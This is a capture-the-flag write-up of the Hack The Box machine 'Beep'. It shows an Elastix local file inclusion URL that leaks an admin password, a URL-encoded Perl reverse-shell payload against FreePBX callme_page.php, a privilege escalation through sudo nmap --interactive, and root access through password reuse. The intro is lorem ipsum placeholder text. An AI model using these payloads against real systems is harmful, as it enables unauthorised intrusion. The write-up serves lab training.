---
layout: single
title: Beep - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-07-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-beep/beep_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-beep/beep_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/htb/beep# nmap -Pn -n 10.10.10.7
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 11:22 CEST
    Nmap scan report for 10.10.10.7
    Host is up (0.037s latency).
    Not shown: 988 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    25/tcp    open  smtp
    80/tcp    open  http
    110/tcp   open  pop3
    111/tcp   open  rpcbind
    143/tcp   open  imap
    443/tcp   open  https
    993/tcp   open  imaps
    995/tcp   open  pop3s
    3306/tcp  open  mysql
    4445/tcp  open  upnotifyp
    10000/tcp open  snet-sensor-mgmt

   DIRB:

   NIKTO:


2. Looking on port 80 we are instantly forwarded to the 443 version prompting us with a Elastix login screen. Googling for this we
   find bunch of exploits, amongst other a authenticated RCE privesc and a unauthenticated LFI that seems promising.

     root@nidus:/git/htb/beep# searchsploit elastix
       ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
        Exploit Title                                                                                                              |  Path
       ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
       ..
       Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                            | php/webapps/37637.pl
       ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------

    Reading the code (searchsploit -x 37637.pl) we find that is real simple and can be done directly in the browser.
      #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

    Visit:
    https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

    In all the text we find the following lines:
      # This is the default admin name used to allow an administrator to login to ARI bypassing all security.
      # Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
      ARI_ADMIN_USERNAME=admin

      # This is the default admin password to allow an administrator to login to ARI bypassing all security.
      # Change this to a secure password.
      ARI_ADMIN_PASSWORD=jEhdIekWmdjE

    Logging in to the site gives me the message "Error - Access denied for 10.10.14.4. The host has been blocked because of too many authentication failures"


3. Wait for the block go timeout, and then login to the elastix service, https://10.10.10.7/.
   Continue to search for elastix exploits we find a RCE:
    FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py

   Just like previous exploit, this is a one-liner that can be used from the URL. For it to work we need to specify
   LHOST = 10.10.14.10
   LPORT = 4488
   RHOST = 10.10.10.7
   EXTENSION = ?

   Looking in Elastix > PBX we find the extension 'Fanis Papafanopoulos <233>', so set this value to 233.
   Setup a listener and paste your one-liner to exploit.

   https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.10%3a4488%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

   [root:/git/htb/beep]# nc -lvnp 4488                                                                                               (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.7] 40047
    whoami
      asterisk
    python -c 'import pty;pty.spawn("/bin/bash")'
      bash-3.2$


    bash-3.2$ sudo -l
      Matching Defaults entries for asterisk on this host:
          env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
          LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
          LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
          LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
          XAUTHORITY"

      User asterisk may run the following commands on this host:
          (root) NOPASSWD: /sbin/shutdown
          (root) NOPASSWD: /usr/bin/nmap
          (root) NOPASSWD: /usr/bin/yum
          (root) NOPASSWD: /bin/touch
          (root) NOPASSWD: /bin/chmod
          (root) NOPASSWD: /bin/chown
          (root) NOPASSWD: /sbin/service
          (root) NOPASSWD: /sbin/init
          (root) NOPASSWD: /usr/sbin/postmap
          (root) NOPASSWD: /usr/sbin/postfix
          (root) NOPASSWD: /usr/sbin/saslpasswd2
          (root) NOPASSWD: /usr/sbin/hardware_detector
          (root) NOPASSWD: /sbin/chkconfig
          (root) NOPASSWD: /usr/sbin/elastix-helper

    bash-3.2$ sudo /usr/bin/nmap --interactive
      Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
      Welcome to Interactive Mode -- press h <enter> for help
      nmap> !sh
        sh-3.2# whoami
          root

        sh-3.2# cat /home/fanis/user.txt
          6e81a26eb20987c5ef0602984f0f66ee

        cat /root/root.txt
          f024f39974fa0274157fbe11845fffa7



(3). We got a password, trying password re-use seems to be a play here as well - we instantly get root. Grab the flags.

    root@nidus:/git/htb/beep# ssh root@beep.htb
      Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
    root@nidus:/git/htb/beep# ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@beep.htb
      root@beep.htb's password: jEhdIekWmdjE
        Last login: Tue Jul 16 11:45:47 2019

        Welcome to Elastix
        ----------------------------------------------------

        To access your Elastix System, using a separate workstation (PC/MAC/Linux)
        Open the Internet Browser using the following URL:
        http://10.10.10.7

      [root@beep ~]# cat root.txt
        d88e006123842106982acce0aaf453f0
      [root@beep ~]# ls -al /home/
        total 28
        drwxr-xr-x  4 root       root       4096 Apr  7  2017 .
        drwxr-xr-x 22 root       root       4096 Jul 30 12:10 ..
        drwxrwxr-x  2 fanis      fanis      4096 Apr  7  2017 fanis
        drwx------  2 spamfilter spamfilter 4096 Apr  7  2017 spamfilter
      [root@beep ~]# cat /home/fanis/user.txt
        aeff3def0c765c2677b94715cffa73ac





██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Elastix LFI:
  https://www.exploit-db.com/exploits/37637
